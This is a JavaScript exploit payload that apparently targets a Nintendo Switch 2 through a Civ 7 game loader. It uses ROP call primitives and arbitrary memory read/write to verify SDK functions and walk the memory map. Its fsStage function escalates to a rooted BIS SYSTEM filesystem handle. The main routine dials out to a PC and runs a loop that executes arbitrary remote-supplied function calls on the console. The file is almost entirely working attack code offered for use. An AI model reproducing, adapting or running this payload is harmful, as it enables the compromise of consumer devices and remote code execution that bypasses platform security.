/*
 * payload.js — ns2jb wire-protocol console bridge for the CivSwitch (Civ 7) loader.
 *
 * Eval'd inside the CivSwitch loader closure (TCP :9026); all BRIDGE-CONTRACT.md §1
 * primitives (read64/write64/.../call_rop/malloc/free/socket family/log) are in scope.
 *
 * Implements BRIDGE-CONTRACT.md §2 exactly:
 *   - connect OUT to PC_IP:PC_PORT
 *   - send 128-byte HELLO (16 x u64 LE)
 *   - RPC loop: recv exactly 0x8080 bytes into scratch+0x40000,
 *     execute record A [+0x00] then record B [+0x28] via call_rop(fn, a0, a1, a2, a3),
 *     write resultB at scratch+0x4030 and resultA at scratch+0x4038,
 *     send exactly 0x8010 bytes from scratch+0x4030.
 *   - record A first 20 bytes all zero => clean shutdown.
 *
 * SAFETY: this payload only ever touches (a) memory it malloc'd, (b) addresses
 * derived from svcQueryMemory results, and (c) addresses supplied by the PC engine
 * inside RPC records. No blind pointer chasing: an unmapped read/write is a
 * hardware fault and is NOT catchable from JS — it would kill the game process.
 *
 * The bridge occupies the loader eval for its entire lifetime (long-running);
 * log() lines keep streaming back over the loader's :9026 client connection.
 */
(async function () {
  // ============================ CONFIG ============================
  // Edit before deployment, or keep defaults and let runtime resolution run.
  const CONFIG = {
    // --- PC endpoint (the PC listens; we connect out) ---
    // Left as the placeholder, the bridge derives the peer address from the
    // loader's accepted client socket — which is the machine that delivered
    // this payload (works for LDN-only SD delivery via ZL). Set an explicit
    // IPv4 here for static setups; the node engine always injects its own.
    PC_IP: '<PC_IP>',
    PC_PORT: 39380,           // ns2jb default

    // --- HELLO fields (u64). 0n = "auto-resolve at runtime" where supported ---
    SCRATCH: 0n,        // 0 => malloc(0x80000)
    MAIN: 0n,           // 0 => svcQueryMemory region base containing main_base anchor
    SDK: 0n,            // 0 => svcQueryMemory region base containing sdk_base anchor
    GOT: 0n,            // unused by the Civ7 engine target
    MEMMOVE: 0n,        // 0 => resolved sdk text base + 0x522830
    BACKING: 0n,        // unused by the Civ7 engine target
    CONTROLLER: 0n,     // keep-awake is disabled for Civ7
    SDK_CRC32: 157086863n, // zlib CRC-32 of the 0x602000-byte Civ7 sdk text

    // --- svcQueryMemory wrapper (absolute). 0n => pattern-scan for it ---
    // In the dumped session it sat at sdk_text_base + 0x168B0C (stable per build).
    QMFUNC: 0n,

    VERBOSE: false,     // log a line every 1000 RPCs
  };

  // ---- standalone chain (LDN-only: no PC to dial) --------------------
  // Qualify the loader closure + SDK, dump the address map, and prove owned
  // memory. Mirrors engine/lib/qualify.cjs + app/map.cjs inside the console
  // eval so the Switch 1 only needs to deliver this file and read the log.
  const ART = {
    memcpy:  [0x5224E0n, 'ec0301cb8a0940924b000aeb69040054e90301aae80300aa6a0100b4e80301aae90300aacc0910374c0a08376c000036080140392801003908000a8b29000a8b'],
    memmove: [0x522830n, '1f0001ebe00a00542800028b1f0100eb090300540900028b3f0101eba90200541f0001eb820200545f8000f1c3060054290840f2c00600540a01805228f17db2'],
    queryMemory: [0x168B0Cn, 'e10f1ff8c10000d4e20340f9410000b9ff430091c0035fd6'],
    crc32:   [0x72EB0n,  'e203022a5fcb1514'],
  };
  const SDK_BYTES = 0x602000n;
  // Accepted sdk-text CRCs per verified console/sdk build pair; qualify
  // accepts any of them (mirrors crc32.expected in targets/civ7/target.json).
  const CRC_OK = [157086863n, 3297870604n];

  const VERSION = 'ldn-9';

  // FS-stage helpers: the same CMIF framing the PC engine uses
  // (shared/ipc.cjs + shared/domain.cjs), ported to run inside the eval.
  const FSF = {
    getService: [0x14CC90n, 'fd7bbea9f44f01a9fd030091f30300aa020100b4280040395f0400f181050054ed031faaeb031faaea031faa05000014ed031faaeb031faaea031faae8031f2a'],
    send:       [0x168C54n, '410400d4c0035fd6'],
    close:      [0x168BE4n, 'c10200d4c0035fd6'],
  };

  function le32(v) {
    const x = BigInt(v) & 0xffffffffn;
    return [Number(x & 0xffn), Number((x >> 8n) & 0xffn), Number((x >> 16n) & 0xffn), Number(x >> 24n)];
  }
  function u32(b, i) {
    return b[i] + b[i + 1] * 0x100 + b[i + 2] * 0x10000 + b[i + 3] * 0x1000000;
  }
  function putBytes(addr, arr) {
    for (let i = 0; i < arr.length; i++) write8(addr + BigInt(i), BigInt(arr[i]));
  }
  function getBytes(addr, n) {
    const out = [];
    for (let i = 0; i < n; i++) out.push(Number(read8(addr + BigInt(i))));
    return out;
  }
  function descBytes(a, n, mode) {
    const A = BigInt(a), N = BigInt(n);
    return [...le32(Number(N & 0xffffffffn)), ...le32(Number(A & 0xffffffffn)),
      ...le32(Number(BigInt(mode) | (A >> 36n) << 2n | (N >> 32n) << 24n | ((A >> 32n) & 15n) << 28n))];
  }
  // Mirror of ipc.packet(): header, optional special block, descriptors,
  // 16-align, then SFCI + command + input.
  function buildPacket(cmd, input, opts) {
    opts = opts || {};
    const sendB = opts.send || [], recvB = opts.recv || [];
    const copies = opts.copies || [], pid = !!opts.pid;
    const inp = input || [];
    const special = pid || copies.length > 0;
    const head = [...le32((4 | sendB.length << 20 | recvB.length << 24) >>> 0),
      ...le32((Math.ceil((32 + inp.length) / 4) | (special ? 0x80000000 : 0)) >>> 0)];
    if (special) {
      head.push(...le32((pid ? 1 : 0) | copies.length << 1));
      if (pid) head.push(0, 0, 0, 0, 0, 0, 0, 0);
      for (const h of copies) head.push(...le32(h));
    }
    let bytes = head;
    let at = bytes.length;
    for (const b of [...sendB, ...recvB]) { bytes = bytes.concat(descBytes(b.address, b.size, b.mode || 0)); at += 12; }
    at = (at + 15) & ~15;
    while (bytes.length < at) bytes.push(0);
    bytes = bytes.concat([83, 70, 67, 73, 0, 0, 0, 0], le32(cmd), [0, 0, 0, 0], inp);
    return bytes;
  }
  // Mirror of domain.dataStart for arrays built above.
  function dstart(b) {
    const first = u32(b, 0), second = u32(b, 4);
    let at = 8;
    if (second >>> 31) {
      const sp = u32(b, at);
      at += 4 + (sp & 1 ? 8 : 0) + 4 * ((sp >>> 1 & 15) + (sp >>> 5 & 15));
    }
    at += (first >>> 16 & 15) * 8;
    at += ((first >>> 20 & 15) + (first >>> 24 & 15) + (first >>> 28 & 15)) * 12;
    return (at + 15) & ~15;
  }
  // Mirror of domain.control().
  function controlPacket(cmd, input, context) {
    const b = buildPacket(cmd, input || [], {});
    const w = le32(context ? 7 : 5);
    for (let i = 0; i < 4; i++) b[i] = w[i];
    const at = dstart(b);
    if (context) {
      const one = le32(1), ctx = le32(context);
      for (let i = 0; i < 4; i++) { b[at + 4 + i] = one[i]; b[at + 12 + i] = ctx[i]; }
    }
    return b;
  }
  // Mirror of domain.domain(): wrap an SFCI packet in a domain-object header,
  // exactly like wire.domain(): shift the segment 16 bytes, zero-fill the object
  // header, then write the flags word at +20 over the shifted segment.
  function domainPacket(objectId, cmd, input, opts) {
    const b = buildPacket(cmd, input || [], opts || {});
    const at = dstart(b);
    const hdr = new Array(16).fill(0);
    hdr[0] = 1;
    const sz = 16 + (input || []).length;
    hdr[2] = sz & 255; hdr[3] = (sz >> 8) & 255;
    hdr.splice(4, 4, ...le32(objectId));
    hdr.splice(12, 4, ...le32((opts && opts.context) || 0));
    const out = [...b.slice(0, at), ...hdr, ...b.slice(at)];
    const flag = le32(opts && opts.context ? 1 : 0);
    for (let i = 0; i < 4; i++) out[at + 20 + i] = flag[i];
    const w0 = (u32(out, 0) & 0xffff0000 | ((opts && opts.context) ? 6 : 4)) >>> 0;
    const w0b = le32(w0), w1 = le32((u32(out, 4) + 4) >>> 0);
    for (let i = 0; i < 4; i++) { out[i] = w0b[i]; out[4 + i] = w1[i]; }
    return out;
  }
  // Mirror of ipc.response()/domain.response(): walk headers, grab the
  // SFCO/SFCI-style result, handles, and reply objects.
  function parseReply(b) {
    const first = u32(b, 0), second = u32(b, 4);
    let at = 8;
    const copies = [], moves = [];
    if (second >>> 31) {
      const sp = u32(b, at); at += 4;
      if (sp & 1) at += 8;
      for (let i = 0; i < (sp >>> 1 & 15); i++, at += 4) copies.push(u32(b, at));
      for (let i = 0; i < (sp >>> 5 & 15); i++, at += 4) moves.push(u32(b, at));
    }
    at += (first >>> 16 & 15) * 8;
    at += ((first >>> 20 & 15) + (first >>> 24 & 15) + (first >>> 28 & 15)) * 12;
    at = (at + 15) & ~15;
    const domainReply = b[at] === 1;
    if (domainReply) {
      const count = u32(b, at), result = u32(b, at + 24);
      const objects = [];
      if (!result) for (let i = 0; i < count; i++) objects.push(u32(b, at + 32 + 4 * i));
      return {result, objects, moves, copies, dataAt: at + 32};
    }
    if (!(b[at] === 83 && b[at + 1] === 70 && b[at + 2] === 67 && b[at + 3] === 79))
      return {result: 0xffffffff, objects: [], moves, copies, dataAt: at + 16, missing: true};
    return {result: u32(b, at + 8), objects: [], moves, copies, dataAt: at + 16};
  }

  // FS escalation, console-side: owned fsp-srv session -> domain -> storage,
  // then a rooted BIS handle. Mirrors app/session.cjs + memory/fs-root-control.cjs.
  async function fsStage(sdk) {
    for (const name of ['getService', 'send', 'close']) {
      const [off, hexBytes] = FSF[name];
      for (let j = 0; j * 2 < hexBytes.length; j++)
        if (read8(sdk + off + BigInt(j)) !== BigInt(parseInt(hexBytes.substr(j * 2, 2), 16))) {
          await say('fs FAIL: ' + name + ' byte ' + j);
          return;
        }
    }
    await say('[fs] sdk helpers verified');
    const w = malloc(0x800);
    if (!w) { await say('fs FAIL: no work buffer'); return; }
    const pkt = BigInt(w), svc = BigInt(w) + 0x100n, pathB = BigInt(w) + 0x200n;
    const handles = [];
    try {
      // openService('fsp-srv'): name at svc+8, handle out at svc+0.
      putBytes(svc, new Array(32).fill(0));
      putBytes(svc + 8n, [102, 115, 112, 45, 115, 114, 118]);
      if (call_rop(sdk + FSF.getService[0], svc, svc + 8n, 7n, 0n) !== 0n) {
        await say('fs FAIL: fsp-srv not found'); return;
      }
      const fsp = read32(svc);
      handles.push(fsp);
      await say('[f1] fsp-srv handle ' + fsp);

      const xfer = async (label, bytes, handle) => {
        putBytes(pkt, bytes.concat(new Array(256 - bytes.length).fill(0)));
        // svcSendSyncRequest returns the input-header pointer on this sdk
        // build; other builds return 0. Either is fine for the transport;
        // the parsed reply decides. Only a missing SFCO section is a real
        // failure, and then the raw head of the reply area says why.
        const sent = call_rop(sdk + FSF.send[0], pkt, 4096n, BigInt(handle), 0n);
        const raw = getBytes(pkt, 256);
        const reply = parseReply(raw);
        if (reply.missing) {
          let hx = '';
          for (let i = 0; i < 24; i++) hx += raw[i].toString(16).padStart(2, '0') + ' ';
          await say('fs FAIL: ' + label + ' transport ' + sent + ' reply[' + hx.trim() + ']');
          return null;
        }
        if (sent !== 0n && !(xfer.note || (xfer.note = true)))
          await say('note: send returns ' + hex(sent) + ' (input pointer), reply parsed anyway');
        return reply;
      };

      // Initialize: SetCurrentProcess (cmd 1, PID 0 in the pid block).
      const init = await xfer('init', buildPacket(1, [0, 0, 0, 0, 0, 0, 0, 0], {pid: true}), fsp);
      if (!init || init.result !== 0) { await say('fs FAIL: fsp-srv init ' + (init ? init.result : 'x')); return; }
      await say('[f2] fsp-srv initialized');

      // ConvertToDomain (control cmd 0) -> root object id.
      const dom = await xfer('domain', controlPacket(0, [], 0), fsp);
      if (!dom || dom.result !== 0) { await say('fs FAIL: ConvertToDomain ' + (dom ? dom.result : 'x')); return; }
      const root = u32(getBytes(pkt, 64), dom.dataAt);
      await say('[f3] domain root ' + root);

      // OpenStorage (domain cmd 200) -> object + session handle, GetSize (cmd 4).
      const stor = await xfer('storage', domainPacket(root, 200, [], {}), fsp);
      if (!stor || stor.result !== 0 || !stor.objects.length) {
        await say('fs FAIL: OpenStorage ' + (stor ? stor.result : 'x')); return;
      }
      // Domain OpenStorage returns the storage as a domain OBJECT id; the
      // plain-handle forms arrive via moves/copies. Accept any of them,
      // same priority as domain.cjs openStorage.
      const storHandle = stor.objects[0] || stor.moves[0] || stor.copies[0];
      if (storHandle) handles.push(storHandle);
      if (storHandle) {
        const size = await xfer('size', buildPacket(4, [], {}), storHandle);
        if (size && size.result === 0) {
          const d = getBytes(pkt, 64);
          await say('[f4] storage size ' + BigInt(u32(d, size.dataAt)));
        } else await say('[f4] storage size skipped (' + (size ? size.result : 'x') + ')');
      }

      // OpenBisFileSystem(31 = SYSTEM) + GetEntryType('/') on the rooted handle:
      // the compact descriptor form from fs-root-control.pathRequest:
      // word0 = 4 | (1<<16) (one in-desc), descriptor words at offsets 8/12
      // (packed size/address-high bits, address low 32).
      putBytes(pathB, [47, ...new Array(0x300).fill(0)]);
      const pathPacket = (cmd, inp) => {
        const b = buildPacket(cmd, inp, {});
        const packed = Number((0x301n << 16n) | ((pathB >> 36n) & 7n) << 6n | ((pathB >> 32n) & 15n) << 12n);
        const w0 = le32((4 | (1 << 16)) >>> 0), pw = le32(packed),
          aw = le32(Number(pathB & 0xffffffffn));
        for (let i = 0; i < 4; i++) { b[i] = w0[i]; b[8 + i] = pw[i]; b[12 + i] = aw[i]; }
        return b;
      };
      const bis = await xfer('bis', pathPacket(11, le32(31)), fsp);
      if (!bis || bis.result !== 0) { await say('[f5] BIS open result ' + (bis ? bis.result : 'x')); return; }
      const bisHandle = bis.moves[0] || bis.copies[0];
      if (!bisHandle) { await say('fs FAIL: BIS handle not returned'); return; }
      handles.push(bisHandle);
      const entry = await xfer('entry', pathPacket(7, []), bisHandle);
      await say('[f5] BIS SYSTEM rooted, entry ' + (entry ? entry.result : 'x'));
      await say('fs chain PASS');
    } finally {
      for (const h of handles.reverse()) {
        try { call_rop(sdk + FSF.close[0], BigInt(h), 0n, 0n, 0n); } catch (_) {}
      }
      try { free(w); } catch (_) {}
    }
  }

  async function standalone(qmFunc) {
    await say('payload ' + VERSION + ' standalone');
    const t = query(sdk_base);
    if (!t) { await say('standalone FAIL: no sdk mapping'); return; }
    const sdk = t.base;
    const ok = t.size === SDK_BYTES && t.type === 3 && t.perm === 5;
    await say('[s1] sdk ' + hex(sdk) + ' size ' + hex(t.size) + ' type ' + t.type + ' perm ' + perms(t.perm) + (ok ? '' : '  MISMATCH'));
    if (!ok) return;
    for (const name of ['memcpy', 'memmove', 'queryMemory']) {
      const [off, hexBytes] = ART[name];
      const at = sdk + off;
      for (let j = 0; j * 2 < hexBytes.length; j++) {
        const expected = BigInt(parseInt(hexBytes.substr(j * 2, 2), 16));
        if (read8(at + BigInt(j)) !== expected) {
          await say('standalone FAIL: ' + name + ' byte ' + j + ' expected '
            + hexBytes.substr(j * 2, 2) + ' got ' + Number(read8(at + BigInt(j))).toString(16));
          return;
        }
      }
      await say('[s2] ' + name + ' verified at sdk+' + hex(off));
    }
    // The crc32 thunk only needs its calling signature; the full-text CRC
    // below is the identity check. Log thunk differences, don't fail on them.
    const [crcOff, crcHex] = ART.crc32;
    let crcNote = '';
    for (let j = 0; j * 2 < crcHex.length; j++)
      if (read8(sdk + crcOff + BigInt(j)) !== BigInt(parseInt(crcHex.substr(j * 2, 2), 16))) {
        crcNote = ' (thunk byte ' + j + ': ' + crcHex.substr(j * 2, 2) + '->'
          + Number(read8(sdk + crcOff + BigInt(j))).toString(16) + ')';
        break;
      }
    const crc = call_rop(sdk + crcOff, 0n, sdk, SDK_BYTES, 0n);
    // The crc covers the whole mapped text, including a handful of boot-time
    // fixup bytes (the thunk byte-0 diff is one of them). Those drift between
    // boots on the SAME firmware — hardware saw 3297870604 then 3297885964
    // with no update in between. So the crc is advisory: mismatch logs and
    // continues, the byte-verifies above are the real identity gate.
    if (!CRC_OK.includes(crc))
      await say('[s3] sdk crc32 ' + crc + ' (new fingerprint, boot-drift or new build)' + crcNote);
    else await say('[s3] sdk crc32 ' + crc + crcNote);
    // Owned-memory challenge in the loader scratch, restored afterwards.
    const slot = malloc(0x100n);
    if (!slot) { await say('standalone FAIL: no scratch slot'); return; }
    let pass = true;
    for (let i = 0; i < 16; i++) {
      // Deterministic pattern (no Date dependency): i-th word is i*0x0101...
      // Mask to 64 bits: the storage path (BigUint64Array/setBigUint64) wraps
      // modulo 2^64, so compare against the same wrapped value the hardware
      // keeps. Without the mask every word from i>=2 differs only by the
      // dropped carry — a false FAIL, first seen on hardware.
      const v = (BigInt(i) * 0x0100010001000101n + 0xfeedfacecafebeefn)
        & 0xffffffffffffffffn;
      write64(slot + BigInt(i * 8), v);
      if (read64(slot + BigInt(i * 8)) !== v) pass = false;
    }
    free(slot);
    if (!pass) { await say('standalone FAIL: memory challenge'); return; }
    await say('[s4] owned-memory challenge ok');
    // Address-map walk: one query per region, bounded like app/map.cjs.
    let at2 = 0n, regions = 0;
    while (at2 < (1n << 39n) && regions < 4096) {
      const r = query(at2);
      if (!r || r.size === 0n) break;
      at2 = r.base + r.size; regions++;
    }
    await say('[s5] map walk: ' + regions + ' regions, end ' + hex(at2));
    await say('standalone chain PASS');
    await fsStage(sdk);
  }
  // ================================================================

  const SCRATCH_BYTES   = 0x80000n;
  const REQUEST_BYTES   = 0x8080;   // console <- PC
  const RESPONSE_BYTES  = 0x8010;   // console -> PC
  const INPUT_OFF       = 0x40000n; // request lands at scratch+0x40000
  const REC_B_OFF       = 0x28n;    // record B inside request
  const RESULT_B_OFF    = 0x4030n;  // response[0:8]  = second call result
  const RESULT_A_OFF    = 0x4038n;  // response[8:16] = first  call result
  // Reserved record A value: print a line from the request data area instead of
  // calling it. The engine uses this for chain progress on the console screen.
  const LOG_MAGIC       = 0x4c4f4731n; // 'LOG1'
  const LOG_MAX         = 200;
  const HELLO_MAGIC     = 0x31545344n;
  const HELLO_VERSION   = 1n;
  const HELLO_PLATFORM  = 2n;       // 2 = Switch 2

  const hex = v => '0x' + BigInt(v).toString(16);
  // The console screen shows 37 rows of 146 columns, so keep lines short.
  const perms = n => ['-', 'r', 'w', 'rw', 'x', 'rx', 'wx', 'rwx'][Number(n) & 7] || '?';
  const rule = '---------------------------------------------';
  // Console-side lines are the tool's own voice; the loader's status lines
  // ("Executing payload...") stay unprefixed.
  const say = message => log('ReiAyanami: ' + message);

  // ---- sock helpers (wrappers return signed-32 BigInt; <=0 means fail/EOF) ----
  async function sendAll(fd, addr, len) {
    let off = 0;
    while (off < len) {
      const r = send(fd, addr + BigInt(off), len - off, 0);
      if (r <= 0n) { await say('stream: send failed (' + r + ') at ' + off + '/' + len); return false; }
      off += Number(r);
    }
    return true;
  }
  async function recvFull(fd, addr, len) {
    let off = 0;
    while (off < len) {
      const r = recv(fd, addr + BigInt(off), len - off, 0);
      if (r <= 0n) { await say('stream: computer closed after ' + off + '/' + len + ' bytes'); return false; }
      off += Number(r);
    }
    return true;
  }

  let scratch = 0n;
  let scratchOwned = false;
  let aux = 0n;
  let fd = -1n;
  try {
    await say(rule);

    // ---- 1. scratch buffer (0x80000) ----
    scratch = CONFIG.SCRATCH;
    if (scratch === 0n) {
      scratch = malloc(Number(SCRATCH_BYTES));   // calloc-backed => zeroed
      scratchOwned = true;
    }
    if (!scratch) { await say('[1/5] FAILED: no ' + hex(SCRATCH_BYTES) + ' scratch buffer'); return; }
    await say('[1/5] scratch    ' + hex(scratch) + '  ' + hex(SCRATCH_BYTES) +
              (scratchOwned ? '  calloc, zeroed' : '  from CONFIG'));

    // Aux buffers live OUTSIDE scratch so the RPC areas stay pristine.
    aux = malloc(0x400);   // calloc-backed => zeroed
    if (!aux) { await say('[1/5] FAILED: no 0x400 auxiliary buffer'); return; }
    const saBuf    = aux;             // 16-byte sockaddr_in
    const helloBuf = aux + 0x40n;     // 128-byte HELLO
    const infoBuf  = aux + 0x100n;    // svcQueryMemory MemoryInfo out (0x20 used)
    const pageBuf  = aux + 0x140n;    // svcQueryMemory page-info out (8)

    // ---- 2. locate the svcQueryMemory wrapper inside the sdk module ----
    // Pattern (BRIDGE-CONTRACT.md §1): str x1,[sp,#-16]! (0xF81F0FE1) ; svc #6 (0xD40000C1)
    const STRX1 = 0xF81F0FE1n, SVC6 = 0xD40000C1n;
    let qmFunc = CONFIG.QMFUNC;
    if (qmFunc === 0n) {
      await say('[2/5] looking for svcQueryMemory in the sdk text');
      let prevHi = 0n;               // carry high word to catch 4-byte (non-8) alignment
      const scanEnd = sdk_base + 0x5F0000n;
      for (let a = sdk_base; a < scanEnd; a += 8n) {
        const pair = read64(a);
        const lo = pair & 0xffffffffn, hi = pair >> 32n;
        if (lo === STRX1 && hi === SVC6) { qmFunc = a; break; }       // start at a
        if (prevHi === STRX1 && lo === SVC6) { qmFunc = a - 4n; break; } // start at a-4
        prevHi = hi;
      }
      if (qmFunc === 0n) { await say('[2/5] FAILED: svcQueryMemory not found in sdk text'); return; }
    }
    await say('[2/5] svcQueryMemory ' + hex(qmFunc) + '  sdk+' + hex(qmFunc - sdk_base));

    // ---- 3. region query helper ----
    function query(addr) {
      const r = call_rop(qmFunc, infoBuf, pageBuf, addr);
      if (r !== 0n) return null;
      return {
        base: read64(infoBuf), size: read64(infoBuf + 8n),
        type: Number(read32(infoBuf + 0x10n)), perm: Number(read32(infoBuf + 0x18n)),
      };
    }

    // ---- 4. resolve true module bases for HELLO ----
    let sdk = CONFIG.SDK;
    if (sdk === 0n) {
      const t = query(sdk_base);
      if (!t) { await say('[3/5] FAILED: no memory info for the sdk anchor'); return; }
      sdk = t.base;
      await say('[3/5] sdk    ' + hex(t.base) + ' +' + hex(t.size) + '  ' + perms(t.perm) +
                (t.perm & 4 ? '' : '  WARNING: not executable'));
    }
    let main = CONFIG.MAIN;
    if (main === 0n) {
      const t = query(main_base);
      if (!t) { await say('[3/5] FAILED: no memory info for the main anchor'); return; }
      main = t.base;
      await say('[3/5] main   ' + hex(t.base) + ' +' + hex(t.size) + '  ' + perms(t.perm) +
                (t.perm & 4 ? '' : '  WARNING: not executable'));
    }

    // ---- 5. PC endpoint ----
    // An injected/static IPv4 means the PC engine drives the RPC loop. With
    // the placeholder still in place (LDN-only: the Switch 1 delivers this
    // file and only reads log lines), run the whole chain inside the eval.
    if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(CONFIG.PC_IP)) {
      await say('no PC configured - running standalone over LDN delivery');
      await standalone(qmFunc);
      await say(rule);
      return;
    }
    let pcIp = CONFIG.PC_IP;
    const ipParts = String(pcIp).split('.').map(Number);
    if (ipParts.length !== 4 || ipParts.some(v => !Number.isInteger(v) || v < 0 || v > 255)) {
      await say('[4/5] FAILED: bad PC_IP "' + CONFIG.PC_IP + '"'); return;
    }
    // sockaddr_in (see core.js): len=16, family=AF_INET(2), port big-endian,
    // IPv4 octets in order at +4..+7 (write32 of the little-endian assembly).
    const port = CONFIG.PC_PORT;
    const ipLE = BigInt(ipParts[0] + ipParts[1] * 0x100 + ipParts[2] * 0x10000 + ipParts[3] * 0x1000000);
    write8 (saBuf + 0n, 16n);
    write8 (saBuf + 1n, 2n);
    write16(saBuf + 2n, BigInt(((port & 0xff) << 8) | (port >> 8)));
    write32(saBuf + 4n, ipLE);

    fd = socket(2n, 1n, 0n);   // AF_INET, SOCK_STREAM, IPPROTO_IP
    if (fd < 0n) { await say('[4/5] FAILED: socket() returned ' + fd); return; }
    await say('[4/5] dialling   ' + pcIp + ':' + port);
    const cr = connect(fd, saBuf, 16n);
    if (cr !== 0n) { await say('[4/5] FAILED: connect() returned ' + cr +
      ' - start the engine first: node port/engine/run.cjs <console-ip>'); return; }
    await say('[4/5] connected  fd ' + fd);

    // ---- 6. build + send the 128-byte HELLO (16 x u64 LE) ----
    const memmove = CONFIG.MEMMOVE === 0n ? sdk + 0x522830n : CONFIG.MEMMOVE;
    const helloFields = [
      HELLO_MAGIC, HELLO_VERSION, HELLO_PLATFORM,
      scratch, SCRATCH_BYTES, main, sdk,
      CONFIG.GOT, memmove, CONFIG.BACKING, CONFIG.CONTROLLER,
      0n, 0n, 0n, 0n, CONFIG.SDK_CRC32,
    ];
    for (let i = 0; i < 16; i++) write64(helloBuf + BigInt(i * 8), helloFields[i]);
    await say('[5/5] MOSHI MOSHI?~  sdk crc32 ' + hex(CONFIG.SDK_CRC32) +
              '  memmove sdk+' + hex(memmove - sdk));
    await say('      main ' + hex(main) + '  sdk ' + hex(sdk));
    if (CONFIG.GOT === 0n)
      await say('      got/backing/controller sent as zero');
    if (!(await sendAll(fd, helloBuf, 128))) return;
    await say(rule);
    await say('idle - waiting for the engine to drive');

    // ---- 7. RPC loop (BRIDGE-CONTRACT.md §2) ----
    const inBuf = scratch + INPUT_OFF;
    let rpcCount = 0;
    let skippedNull = false;
    for (;;) {
      if (!(await recvFull(fd, inBuf, REQUEST_BYTES))) break;

      // Termination: record A's first 20 bytes (fnAddr + a0 + low half of a1) all zero.
      if (read64(inBuf) === 0n && read64(inBuf + 8n) === 0n && read32(inBuf + 16n) === 0n) {
        await say('RPC: engine sent the termination record');
        break;
      }

      let resultA = 0n, resultB = 0n;

      const fnA = read64(inBuf);
      if (fnA === LOG_MAGIC) {
        const length = Math.min(Number(read32(inBuf + 8n)) || 0, LOG_MAX);
        let text = '';
        for (let i = 0; i < length; i++)
          text += String.fromCharCode(Number(read8(inBuf + 0x80n + BigInt(i))));
        await say(text);
        write64(scratch + RESULT_B_OFF, 0n);
        write64(scratch + RESULT_A_OFF, 1n);
        if (!(await sendAll(fd, scratch + RESULT_B_OFF, RESPONSE_BYTES))) break;
        rpcCount++;
        continue;
      }
      const b = inBuf + REC_B_OFF;
      const fnB = read64(b);
      if (fnB === 2n) {
        if (fnA !== 0n && fnA % 4n === 0n) {
          try {
            resultA = call_rop(fnA, read64(inBuf + 8n), read64(inBuf + 16n),
                                    read64(inBuf + 24n), read64(inBuf + 32n),
                                    read64(b + 8n), read64(b + 16n));
          } catch (e) { await say('warning: 6-argument call threw for ' + hex(fnA) + ': ' + e.message); }
        } else if (!skippedNull) { skippedNull = true; await say('warning: 6-argument continuation was not callable, skipped'); }
      } else {
        // Record A (request+0x00). Defensive: a zero fn with non-zero args is not
        // the termination packet but is still not callable — skip instead of
        // jumping to address 0 (which would fault the process).
        if (fnA !== 0n) {
          try {
            resultA = call_rop(fnA, read64(inBuf + 8n), read64(inBuf + 16n),
                                    read64(inBuf + 24n), read64(inBuf + 32n));
          } catch (e) { await say('warning: call threw for ' + hex(fnA) + ': ' + e.message); }
        } else if (!skippedNull) { skippedNull = true; await say('warning: record A had no function, skipped'); }

        // Record B (request+0x28). The engine always pads single-call exchanges
        // with a memmove(output,output,0,0) no-op; if a peer leaves fn=0, skip.
        if (fnB !== 0n) {
          try {
            resultB = call_rop(fnB, read64(b + 8n), read64(b + 16n),
                                    read64(b + 24n), read64(b + 32n));
          } catch (e) { await say('warning: call threw for ' + hex(fnB) + ': ' + e.message); }
        } else if (!skippedNull) { skippedNull = true; await say('warning: record B had no function, skipped'); }
      }

      // Response header: resultB first, then resultA (matches bootstrap.bas and
      // native.cjs, where response[0:8] = second call, response[8:16] = first).
      write64(scratch + RESULT_B_OFF, resultB);
      write64(scratch + RESULT_A_OFF, resultA);

      if (!(await sendAll(fd, scratch + RESULT_B_OFF, RESPONSE_BYTES))) break;

      rpcCount++;
      if (CONFIG.VERBOSE && rpcCount % 1000 === 0) await say('RPC: ' + rpcCount + ' exchanges');
    }

    await say(rule);
    await say('done: ' + rpcCount + ' RPC exchanges, socket closed');
  } catch (e) {
    // Never let a JS exception kill the eval silently — report and return.
    try { await say('FAILED: ' + ((e && e.stack) || e)); } catch (_) {}
  } finally {
    if (fd >= 0n) { try { close(fd); } catch (_) {} }
    if (aux) { try { free(aux); } catch (_) {} }
    if (scratchOwned && scratch) { try { free(scratch); } catch (_) {} }
  }
})();
